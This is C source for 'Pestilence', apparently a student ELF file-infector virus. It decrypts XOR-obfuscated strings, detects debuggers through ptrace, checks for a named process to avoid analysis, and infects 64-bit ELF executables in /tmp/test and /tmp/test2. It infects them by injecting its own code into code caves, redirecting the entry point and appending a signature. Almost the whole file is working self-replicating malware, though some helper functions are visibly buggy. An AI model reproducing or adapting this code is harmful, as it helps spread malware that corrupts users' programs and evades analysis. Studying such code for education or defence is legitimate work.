#include "sys/types.h"
#include <dirent.h>
#include <elf.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/syscall.h>

// #define BUILDER_SIZE 0x16a;
// #define BUILDER_RE_ENTRY_OFFSET 0xe5 + 0x19;
#define BUILDER_SIZE 0x151;
#define BUILDER_RE_ENTRY_OFFSET 0xe5;

__attribute__((section(".text"))) static char signatur[] = "Pestilence | abied-ch & fbruggem";
__attribute__((section(".text"))) static char path_self[] = {0x6d, 0x32, 0x30, 0x2d, 0x21, 0x6d, 0x31, 0x27, 0x2e, 0x24, 0x6d, 0x27, 0x3a, 0x27, 0x00};
__attribute__((section(".text"))) static char mappings_path[] = {0x6d, 0x32, 0x30, 0x2d, 0x21, 0x6d, 0x31, 0x27,
                                                                 0x2e, 0x24, 0x6d, 0x2f, 0x23, 0x32, 0x31, 0x00};
__attribute__((section(".text"))) static char slash_proc[] = {0x6d, 0x32, 0x30, 0x2d, 0x21, 0x6d, 0x00};
__attribute__((section(".text"))) static char slash_cmdline[] = {0x6d, 0x21, 0x2f, 0x26, 0x2e, 0x2b, 0x2c, 0x27, 0x00};
__attribute__((section(".text"))) static char bad_process_name[] = {0x73, 0x72, 0x74, 0x77, 0x23, 0x71, 0x26, 0x7b, 0x77,
                                                                    0x23, 0x23, 0x77, 0x76, 0x77, 0x73, 0x20, 0x00};

typedef struct {
    uint64_t d_ino;
    uint64_t d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
} dirent64;

typedef struct {
    void *mem;
    uint64_t size;
} file;

typedef struct {
    uint64_t start;
    uint64_t size;
    uint8_t is_executable;
} code_cave;

typedef struct {
    uint64_t start;
    uint64_t size;
} entry;

__attribute__((always_inline)) inline long sys(long n, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6);
__attribute__((always_inline)) inline void ft_exit(int exit_code);
__attribute__((always_inline)) inline int ft_open(char *path, volatile int flags, volatile mode_t mode);
__attribute__((always_inline)) inline int ft_close(volatile int fd);
__attribute__((always_inline)) inline int ft_getdents64(int fd, char dirp[], size_t count);
__attribute__((always_inline)) inline int ft_read(int fd, void *ptr, size_t size);
__attribute__((always_inline)) inline int ft_write(int fd, void *ptr, size_t size);
__attribute__((always_inline)) inline int ft_lseek(int fd, off_t offset, int whence);
__attribute__((always_inline)) inline uint64_t ft_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
__attribute__((always_inline)) inline int64_t ft_munmap(void *addr, size_t length);

__attribute__((always_inline)) static inline int infect_dir(char *dir_path, int fd_self);
__attribute__((always_inline)) static inline int infect_file(char *path, file *file_self);
__attribute__((always_inline)) inline int file_mmap(int fd, file *file);
__attribute__((always_inline)) inline int file_munmap(file *file);
__attribute__((always_inline)) inline int elf64_ident_check(const Elf64_Ehdr *header);
__attribute__((always_inline)) inline Elf64_Shdr *get_next_section_header(uint64_t section_cur_end, file file);
__attribute__((always_inline)) inline int code_caves_get(code_cave *code_caves, volatile file *file);
__attribute__((always_inline)) inline uint64_t addr_to_offset(file *file, uint64_t addr);
__attribute__((always_inline)) inline uint64_t code_caves_size_sum(volatile code_cave code_caves[], uint64_t code_cave_num);
__attribute__((always_inline)) inline uint64_t entries_size_sum(entry entries[], uint64_t entries_num);
__attribute__((always_inline)) inline uint64_t reserve_builder(file *file_target, void *builder_self_start, volatile uint64_t builder_self_size,
                                                               code_cave *code_caves_target, volatile uint64_t code_caves_target_num);
__attribute__((always_inline)) inline uint64_t reserve_scaffol_table(file *file_target, code_cave *code_caves_target, volatile uint64_t code_caves_target_num);
__attribute__((always_inline)) inline uint64_t copy_entries_into_code_caves(entry *entries_target, entry *entries_self, volatile uint64_t entries_self_num,
                                                                            file *file_self, file *file_target, code_cave *code_caves_target,
                                                                            volatile uint64_t code_caves_target_num);
__attribute__((always_inline)) inline uint64_t offset_to_addr(file *file, uint64_t offset);
__attribute__((always_inline)) inline int file_write(int fd, file *file);
__attribute__((always_inline)) inline uint64_t old_entry_get(file *file);

__attribute__((always_inline)) inline int ft_strlen(char *str);
__attribute__((always_inline)) inline void ft_strncpy(char *src, char *dst, size_t size);
__attribute__((always_inline)) inline void ft_memcpy(void *src, void *dst, uint64_t size);

// __attribute__((always_inline)) inline void
// print_number_hex(volatile uint64_t num) {
//     char buf[20];
//     int pos = 0;

//     if (num == 0) {
//         char c = '0';
//         ft_write(1, &c, 1);
//         return;
//     }

//     while (num > 0) {
//         uint64_t cur = num % 16;
//         if (cur < 10)
//             buf[pos++] = '0' + cur;
//         else
//             buf[pos++] = 'a' + cur - 10;
//         num /= 16;
//     }

//     while (pos > 0) {
//         char c = buf[--pos];
//         ft_write(1, &c, 1);
//     }
// }

// __attribute__((always_inline)) inline void
// print_number(volatile uint64_t num) {
//     char buf[20];
//     int pos = 0;

//     if (num == 0) {
//         char c = '0';
//         ft_write(1, &c, 1);
//         return;
//     }

//     while (num > 0) {
//         buf[pos++] = '0' + (num % 10);
//         num /= 10;
//     }

//     while (pos > 0) {
//         char c = buf[--pos];
//         ft_write(1, &c, 1);
//     }
// }
//
// __attribute__((always_inline)) static inline void
// print_nice(volatile uint64_t value) {
//     char nl = '\n';
//     ft_write(1, &nl, 1);
//     print_number_hex(value);
//     ft_write(1, &nl, 1);
// }

__attribute__((always_inline)) static inline volatile int
ft_isdigit(const char *const s) {
    for (int i = 0; s[i]; ++i) {
        if (s[i] < '0' && s[i] > '9') {
            return 0;
        }
    }
    return 1;
}

__attribute__((always_inline)) static inline void
ft_bzero(char *bytes, volatile size_t len) {
    for (int i = 0; i < len; ++i) {
        bytes = 0;
    }
}

__attribute__((always_inline)) inline void
ft_strcat(char *dst, char *src) {
    while (*dst) {
        dst++;
    }
    for (int i = 0; src[i]; ++i) {
        dst[i] = src[i];
    }
}

__attribute__((always_inline)) inline int
ft_strnstr(char *haystack, char *needle, size_t size, volatile size_t needle_size) {
    int i = 0;
    int j;

    while ((i + needle_size) < size) {
        j = 0;
        while ((i + j) < (size)) {
            char c = '\n';
            if (haystack[i + j] != needle[j]) break;
            if (j == (needle_size - 1)) {
                return (1);
            }
            j++;
        }
        i++;
    }
    return (0);
}

__attribute__((always_inline)) inline static void
decrypt() {
    for (volatile int i = 0; path_self[i]; ++i) {
        path_self[i] ^= 0x42;
    }
    for (volatile int i = 0; mappings_path[i]; ++i) {
        mappings_path[i] ^= 0x42;
    }
    for (volatile int i = 0; slash_proc[i]; ++i) {
        slash_proc[i] ^= 0x42;
    }
    for (volatile int i = 0; slash_cmdline[i]; ++i) {
        slash_cmdline[i] ^= 0x42;
    }
    for (volatile int i = 0; bad_process_name[i]; ++i) {
        bad_process_name[i] ^= 0x42;
    }
}

__attribute__((always_inline)) static inline int
bad_process_running() {

    char path[256];
    volatile char cmdline_buf[1024];
    volatile char getdents_buf[4096];

    char *a[] = {path, (char *)cmdline_buf, (char *)getdents_buf};
    for (int i = 0; i < 3; ++i) {
        ft_bzero(a[i], i == 0 ? 256 : i == 1 ? 1024 : 4096);
    }

    int dirfd = ft_open(slash_proc, O_RDONLY, 0);
    if (dirfd < 0) {
        return 0;
    }

    path[0] = 0;
    ft_strcat(path, slash_proc);

    while (1) {
        int64_t bytes_read = ft_getdents64(dirfd, (char *)getdents_buf, sizeof(getdents_buf));
        if (bytes_read <= 0) {
            break;
        }
        int64_t offset = 0;
        while (offset < bytes_read) {
            for (int i = 6; i < sizeof(path); ++i) {
                path[i] = 0;
            }
            dirent64 *entry = (dirent64 *)(getdents_buf + offset);
            offset += entry->d_reclen;
            if (!ft_isdigit(entry->d_name)) {
                continue;
            }
            const uint64_t len = ft_strlen(entry->d_name);
            if (len + 14 > sizeof(path)) {
                continue;
            }
            char *b[] = {entry->d_name, slash_cmdline};
            for (int i = 0; i < 2; ++i) {
                ft_strcat(path, b[i]);
            }

            int fd = ft_open(path, O_RDONLY, 0);
            if (fd < 0) {
                continue;
            }

            int64_t read_bytes = ft_read(fd, (char *)cmdline_buf, sizeof(cmdline_buf));
            ft_close(fd);
            if (read_bytes < 0) {
                continue;
            }
            if (ft_strnstr((char *)cmdline_buf, bad_process_name, read_bytes, 16)) {
                ft_close(dirfd);
                return 1;
            }
        }
    }
    ft_close(dirfd);
    return 0;
}

__attribute__((always_inline)) static inline int
in_debugger() {
    return sys(SYS_ptrace, 0, 1, 0, 0, 0, 0);
}

__attribute__((always_inline)) static inline uint64_t
parse_hex(volatile char *hex) {
    uint64_t r = 0;
    for (int i = 0; i < 16; i++) {
        unsigned c = hex[i];
        if (c == '-') break;

        c = (c & 0xF) + (c > '9' ? 9 : 0);

        r = (r << 4) | c;
    }
    return r;
}

__attribute__((always_inline)) static inline uint64_t
get_base_address() {
    int fd = ft_open(mappings_path, O_RDONLY, 0);

    volatile char buffer[0x1000] = {0};

    ft_read(fd, (char *)buffer, 0x1000);

    uint64_t was_here_once = 0;

    for (int idx = 0; idx < sizeof(buffer); ++idx) {
        if (buffer[idx] == '\n') {
            if (was_here_once == 0) {
                was_here_once = 1;
                continue;
            }
            return parse_hex(buffer + idx + 1);
            break;
        }
    }
    return 0;
}
__attribute__((always_inline)) static inline void
jump_back(int fd_self) {
    file file_self;

    file_mmap(fd_self, &file_self);

    uint64_t old_entry = old_entry_get(&file_self);
    if (old_entry == 0) {
        ft_close(fd_self);
        ft_exit(0);
    }

    Elf64_Ehdr *header = file_self.mem;
    uint64_t jump_to = header->e_entry + BUILDER_RE_ENTRY_OFFSET;
    if (header->e_type == ET_DYN) {
        jump_to += get_base_address();
    }
    ft_close(fd_self);
    __asm__ volatile("jmp *%0" : : "r"(jump_to));
}

void
_start() {
    for (int fd = 3; ft_close(fd) == -1 && fd < 1024; ++fd)
        ;

    decrypt();
    int fd_self = ft_open(path_self, O_RDONLY, 0);
    if (fd_self < 0) {
        ft_exit(0);
    };

    if (in_debugger() || bad_process_running()) jump_back(fd_self);

    for (uint64_t x = 3; x < 201; x++) {
        if (x % 2 == 0) {
            int fd = ft_open(path_self, O_RDONLY, 0);
            int fd2 = ft_open(slash_proc, O_RDONLY, 0);

            char buf[200];

            ft_read(fd_self, buf, x % 100);

            file file;
            file_mmap(fd_self, &file);

            int index = (x % 100) % 47;
            if (index < '0') buf[index] += '9';

            ft_close(fd);
            ft_close(fd2);
        }

        if (x % 109 == 0) {

            char dir[11];
            dir[0] = '/';
            dir[1] = 't';
            dir[2] = 'm';
            dir[3] = 'p';
            dir[4] = '/';
            dir[5] = 't';
            dir[6] = 'e';
            dir[7] = 's';
            dir[8] = 't';
            dir[9] = '\0';

            if (infect_dir(dir, fd_self)) continue;
        }

        if (x % 2 == 0) {
            int fd = ft_open(mappings_path, O_RDONLY, 0);

            volatile char buf[400] = {0};

            ft_read(fd_self, (char *)buf, x % 312);

            file file;
            file_mmap(fd_self, &file);

            int index = (x % 100) % 47;
            if (buf[index] < '0') buf[index] += '9';

            file_munmap(&file);
            ft_close(fd);
        }
    }
    jump_back(fd_self);
}

__attribute__((always_inline)) inline int
infect_dir(char *dir_path, int fd_self) {
    for (int dir_index = 0; dir_index < 2; dir_index++) {

        int fd_dir = ft_open(dir_path, O_RDONLY, O_DIRECTORY);
        if (fd_dir < 0) {
            dir_path[9] = '2';
            dir_path[10] = '\0';
            continue;
        }

        const uint64_t FILE_NAME_MAX = 255;
        const uint64_t DIR_P_SIZE_WITHOUT_ALIGNMENT = FILE_NAME_MAX + sizeof(dirent64);
        const uint64_t ALINMENT = 8;
        const uint64_t DIR_P_SIZE = DIR_P_SIZE_WITHOUT_ALIGNMENT + DIR_P_SIZE_WITHOUT_ALIGNMENT % ALINMENT;

        file file_self;
        char dirp[DIR_P_SIZE];
        int bytes_read = 0;
        do {
            bytes_read = ft_getdents64(fd_dir, dirp, DIR_P_SIZE);
            if (bytes_read < 0) {
                ft_close(fd_dir);
                return 1;
            }

            dirent64 *dirent_cur = (dirent64 *)dirp;
            while ((((long)dirent_cur) - (long)dirp) < bytes_read) {
                if (dirent_cur->d_type == DT_REG) {
                    size_t d_name_len = ft_strlen(dirent_cur->d_name);
                    size_t dir_path_len = ft_strlen(dir_path);
                    char full_path[d_name_len + dir_path_len + 1 + 1];
                    ft_strncpy(dir_path, full_path, dir_path_len);
                    full_path[dir_path_len] = '/';
                    ft_strncpy(dirent_cur->d_name, full_path + dir_path_len + 1, d_name_len + 1);

                    file_mmap(fd_self, &file_self);
                    infect_file(full_path, &file_self);
                    file_munmap(&file_self);
                }
                dirent_cur = (dirent64 *)((void *)dirent_cur + dirent_cur->d_reclen);
            }
        } while (bytes_read > 0);

        ft_close(fd_dir);
        dir_path[9] = '2';
        dir_path[10] = '\0';
    }
    return (0);
}

__attribute__((always_inline)) inline int
infect_file(char *path, file *file_self) {
    int fd_target = ft_open(path, O_RDWR, 0);
    if (fd_target < 0) return (1);

    file file_target;
    if (file_mmap(fd_target, &file_target)) {
        ft_close(fd_target);
        return 1;
    };

    if (ft_strnstr(file_target.mem, signatur, file_target.size, 33)) {
        ft_close(fd_target);
        return 0;
    }

    if (elf64_ident_check((Elf64_Ehdr *)file_target.mem)) {
        ft_close(fd_target);
        return 0;
    }

    code_cave code_caves_target[100];
    uint64_t code_caves_target_num = code_caves_get(code_caves_target, &file_target);

    volatile Elf64_Ehdr *header_self = file_self->mem;
    void *builder_self_start = file_self->mem + addr_to_offset(file_self, header_self->e_entry);
    uint64_t builder_self_size = BUILDER_SIZE;

    uint64_t *builder_self_table_start = builder_self_start + builder_self_size - 16;
    uint64_t *builder_self_table_size = builder_self_start + builder_self_size - 8;

    volatile entry *entries_self = file_self->mem + *builder_self_table_start;
    uint64_t entries_self_num = *builder_self_table_size;
    uint64_t provided_space = code_caves_size_sum(code_caves_target, code_caves_target_num);
    uint64_t needed_space_table = code_caves_target_num * 16;
    uint64_t needed_space = entries_size_sum((entry *)entries_self, entries_self_num) + needed_space_table;

    if (provided_space < needed_space) {
        ft_close(fd_target);
        return 0;
    }

    uint64_t builder_target_start_offset = reserve_builder(&file_target, builder_self_start, builder_self_size, code_caves_target, code_caves_target_num);
    uint8_t not_enough_space_for_builder = builder_target_start_offset == 0;

    if (not_enough_space_for_builder) {
        ft_close(fd_target);
        return 0;
    }

    Elf64_Ehdr *header_target = file_target.mem;
    for (int i = 0; i < header_target->e_phnum; i++) {
        Elf64_Phdr *table = file_target.mem + header_target->e_phoff;
        Elf64_Phdr *ph = table + i;
        if (ph->p_offset + ph->p_filesz == builder_target_start_offset) {
            ph->p_filesz += builder_self_size;
            ph->p_memsz += builder_self_size;
        }
    }

    uint64_t scaffolt_target_start_offset = reserve_scaffol_table(&file_target, code_caves_target, code_caves_target_num);

    uint64_t scaffold_target_size = copy_entries_into_code_caves(file_target.mem + scaffolt_target_start_offset, (entry *)entries_self, entries_self_num,
                                                                 file_self, &file_target, code_caves_target, code_caves_target_num);

    uint64_t *target_old_entry = file_target.mem + builder_target_start_offset + builder_self_size - 24;
    uint64_t *target_scaffold_start_offset = file_target.mem + builder_target_start_offset + builder_self_size - 16;
    uint64_t *target_scaffold_num = file_target.mem + builder_target_start_offset + builder_self_size - 8;

    uint64_t old_entry_diff = builder_target_start_offset + 0xe5 - addr_to_offset(&file_target, header_target->e_entry);
    *target_old_entry = old_entry_diff;
    *target_scaffold_start_offset = scaffolt_target_start_offset;
    *target_scaffold_num = scaffold_target_size;

    header_target->e_entry = offset_to_addr(&file_target, builder_target_start_offset);

    if (!ft_strnstr(file_target.mem, signatur, file_target.size, 33)) {
        ft_lseek(fd_target, 0, SEEK_END);
        ft_write(fd_target, signatur, 28);
    }

    file_write(fd_target, &file_target);
    ft_close(fd_target);
    return (0);
}

__attribute__((always_inline)) inline int
file_write(int fd, file *file) {
    uint64_t off = ft_lseek(fd, 0, SEEK_SET);
    if (off == -1) return 1;

    ft_write(fd, file->mem, file->size);
    return 0;
}

__attribute__((always_inline)) inline int
file_mmap(int fd, file *file) {
    uint64_t off = ft_lseek(fd, 0, SEEK_END);
    if (off <= 0) return 1;
    file->size = off;

    off = ft_lseek(fd, 0, SEEK_SET);
    if (off == -1) return 1;

    file->mem = (void *)ft_mmap(0, file->size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
    return 0;
}

__attribute__((always_inline)) inline int
file_munmap(file *file) {
    return ft_munmap(file->mem, file->size);
}

__attribute__((always_inline)) inline uint64_t
copy_entries_into_code_caves(entry *et, entry *es, uint64_t es_n, file *fs, file *ft, code_cave *cc, uint64_t cc_n) {
    uint64_t si = 0;

    for (uint64_t i = 0; i < cc_n; i++) {
        entry *t = et + i;
        code_cave *c = cc + i;

        t->start = c->start;

        while (c->size) {
            entry *s = es + si;

            uint64_t n = c->size < s->size ? c->size : s->size;

            ft_memcpy(fs->mem + s->start, ft->mem + c->start, n);

            c->start += n;
            c->size -= n;
            t->size += n;

            s->start += n;
            s->size -= n;

            if (s->size == 0) {
                si++;
                if (si >= es_n) return i + 1;
            }
        }
    }
    return 0;
}

__attribute__((always_inline)) inline uint64_t
old_entry_get(file *file) {
    Elf64_Ehdr *header = file->mem;

    uint64_t builder_start_offset = addr_to_offset(file, header->e_entry);
    uint64_t builder_size = BUILDER_SIZE;

    uint64_t old_entry_offset = builder_start_offset + builder_size - 24;

    uint64_t *old_entry = file->mem + old_entry_offset;
    return (*old_entry);
}

__attribute__((always_inline)) inline uint64_t
reserve_scaffol_table(file *file_target, code_cave *code_caves_target, volatile uint64_t code_caves_target_num) {
    for (int i = 0; i < code_caves_target_num; i++) {
        code_cave *cave = code_caves_target + i;
        if (cave->size >= code_caves_target_num * 16) {
            cave->start += code_caves_target_num * 16;
            cave->size -= code_caves_target_num * 16;
            return cave->start - (code_caves_target_num * 16);
        }
    }
    return 0;
}

__attribute__((always_inline)) inline uint64_t
reserve_builder(file *file_target, void *builder_self_start, volatile uint64_t builder_self_size, code_cave *code_caves_target,
                volatile uint64_t code_caves_target_num) {
    uint8_t big_enough_builder_space = 0;
    for (int i = 0; i < code_caves_target_num; i++) {
        code_cave *cave = code_caves_target + i;
        if (cave->is_executable)
            if (cave->size >= builder_self_size) {
                ft_memcpy(builder_self_start, file_target->mem + cave->start, builder_self_size);
                cave->start += builder_self_size;
                cave->size -= builder_self_size;
                return cave->start - builder_self_size;
            }
    }

    return 0;
}

__attribute__((always_inline)) inline void
ft_memcpy(void *src, void *dst, uint64_t size) {
    char *src_c = src;
    char *dst_c = dst;

    for (int i = 0; i < size; i++) {
        dst_c[i] = src_c[i];
    }
}

__attribute__((always_inline)) inline int
ft_strlen(char *str) {
    int i = 0;
    while (str[i] != '\0') {
        i++;
    }
    return (i);
}

__attribute__((always_inline)) inline void
ft_strncpy(char *src, char *dst, size_t size) {
    int i = 0;
    for (int i = 0; i < size; i++) {
        dst[i] = src[i];
    }
}

__attribute__((always_inline)) inline int
elf64_ident_check(const Elf64_Ehdr *header) {
    if (header->e_ident[EI_MAG0] != ELFMAG0) return 1;
    if (header->e_ident[EI_MAG1] != ELFMAG1) return 1;
    if (header->e_ident[EI_MAG2] != ELFMAG2) return 1;
    if (header->e_ident[EI_MAG3] != ELFMAG3) return 1;

    if (header->e_ident[EI_CLASS] != ELFCLASS64) return 2;

    if (header->e_ident[EI_DATA] == ELFDATANONE) return 3;

    if (header->e_ident[EI_VERSION] != EV_CURRENT) return 4;

    for (size_t i = EI_PAD; i < sizeof(header->e_ident); i++) {
        if (header->e_ident[i] != 0) return 5;
    }
    return 0;
}

__attribute__((always_inline)) inline int
code_caves_get(code_cave *code_caves, volatile file *file) {
    Elf64_Shdr *section_header = NULL;
    Elf64_Ehdr *header = file->mem;
    uint64_t section_cur_end = header->e_phoff + header->e_phentsize * header->e_phnum;
    uint64_t section_old_end = 0;
    uint8_t this_one_is_executable = 0;
    uint8_t last_one_was_executable = 0;
    int i = 0;
    do {
        section_old_end = section_cur_end;
        last_one_was_executable = this_one_is_executable;
        section_header = get_next_section_header(section_cur_end, *file);
        if (section_header != NULL) {
            this_one_is_executable = section_header->sh_flags & SHF_EXECINSTR;
            section_cur_end = section_header->sh_offset + section_header->sh_size;
        } else {
            char nl = '\n';
            return i;
        }

        if (section_old_end != section_header->sh_offset && section_header->sh_offset - section_old_end > 16) {
            if (!(section_old_end <= header->e_shoff && section_header->sh_offset >= header->e_shoff + header->e_shnum * header->e_shentsize)) {

                code_caves[i].start = section_old_end;
                code_caves[i].size = section_header->sh_offset - section_old_end;
                code_caves[i].is_executable = last_one_was_executable;
                i++;
            }
        }
    } while (section_header != NULL);
    return i;
}

__attribute__((always_inline)) inline Elf64_Shdr *
get_bss_section_header(file file) {
    Elf64_Ehdr *header = file.mem;
    Elf64_Shdr *section_header_table = file.mem + header->e_shoff;

    Elf64_Shdr *section_header_next = NULL;

    for (int i = 0; i < header->e_shnum; i++) {
        Elf64_Shdr *sh = file.mem + header->e_shoff + (header->e_shentsize * i);

        if (sh->sh_type == SHT_NOBITS) return sh;
    }
    return NULL;
}
__attribute__((always_inline)) inline Elf64_Shdr *
get_next_section_header(uint64_t section_cur_end, file file) {
    Elf64_Ehdr *header = file.mem;
    Elf64_Shdr *section_header_table = file.mem + header->e_shoff;

    Elf64_Shdr *section_header_next = NULL;

    for (int i = 0; i < header->e_shnum; i++) {
        Elf64_Shdr *sh = file.mem + header->e_shoff + (header->e_shentsize * i);

        Elf64_Shdr *bs = get_bss_section_header(file);
        if (sh->sh_offset >= section_cur_end && (bs == NULL || bs->sh_offset > sh->sh_offset)) {
            if (section_header_next == NULL || section_header_next->sh_offset > sh->sh_offset) {
                section_header_next = sh;
            }
        }
    }
    return section_header_next;
}

inline uint64_t
offset_to_addr(file *file, uint64_t offset) {
    Elf64_Ehdr *header = file->mem;

    Elf64_Phdr *program_header_table = file->mem + header->e_phoff;

    for (int i = 0; i < header->e_phnum; i++) {
        Elf64_Phdr *ph = program_header_table + i;
        if (offset >= ph->p_offset && offset <= ph->p_offset + ph->p_filesz) return offset + (ph->p_vaddr - ph->p_offset);
    }

    return 0;
}

inline uint64_t
addr_to_offset(file *file, uint64_t addr) {
    Elf64_Ehdr *header = file->mem;

    Elf64_Phdr *program_header_table = file->mem + header->e_phoff;

    for (int i = 0; i < header->e_phnum; i++) {
        Elf64_Phdr *ph = program_header_table + i;
        if (addr >= ph->p_vaddr && addr < ph->p_vaddr + ph->p_memsz) return (addr + ph->p_offset) - ph->p_vaddr;
    }

    return 0;
}

inline uint64_t
code_caves_size_sum(volatile code_cave code_caves[], volatile uint64_t code_cave_num) {
    uint64_t total = 0;
    for (int i = 0; i < code_cave_num; i++)
        total += code_caves[i].size;
    return total;
}

inline uint64_t
entries_size_sum(entry entries[], uint64_t entries_num) {
    uint64_t total = 0;
    for (int i = 0; i < entries_num; i++)
        total += entries[i].size;
    return total;
}

inline long
sys(long n, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6) {
    long ret;
    register long r10 __asm__("r10") = arg4;
    register long r8 __asm__("r8") = arg5;
    register long r9 __asm__("r9") = arg6;
    __asm__ volatile("syscall" : "=a"(ret) : "a"(n), "D"(arg1), "S"(arg2), "d"(arg3), "r"(r10), "r"(r8), "r"(r9) : "rcx", "r11", "memory");
    return ret;
}

__attribute__((always_inline)) inline void
ft_exit(int exit_code) {
    sys(SYS_exit, exit_code, 0, 0, 0, 0, 0);
}

__attribute__((always_inline)) inline int
ft_open(char *path, volatile int flags, volatile mode_t mode) {
    return sys(SYS_open, (long)path, flags, mode, 0, 0, 0);
}

__attribute__((always_inline)) inline int
ft_close(volatile int fd) {
    return sys(SYS_close, (long)fd, 0, 0, 0, 0, 0);
}

__attribute__((always_inline)) inline int
ft_getdents64(int fd, char dirp[], size_t count) {
    return sys(SYS_getdents64, fd, (long)dirp, count, 0, 0, 0);
}

__attribute__((always_inline)) inline int
ft_write(int fd, void *ptr, size_t size) {
    return sys(SYS_write, fd, (long)ptr, size, 0, 0, 0);
}

__attribute__((always_inline)) inline int
ft_read(int fd, void *ptr, size_t size) {
    return sys(SYS_read, fd, (long)ptr, size, 0, 0, 0);
}

__attribute__((always_inline)) inline int
ft_lseek(int fd, off_t offset, int whence) {
    return sys(SYS_lseek, fd, (long)offset, whence, 0, 0, 0);
}

__attribute__((always_inline)) inline uint64_t
ft_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
    return sys(SYS_mmap, (long)addr, length, prot, flags, fd, offset);
}

__attribute__((always_inline)) inline int64_t
ft_munmap(void *addr, size_t length) {
    int64_t ret = sys(SYS_munmap, (uint64_t)addr, length, 0, 0, 0, 0);
    if (ret == -1) {
        return 1;
    }
    return ret;
}
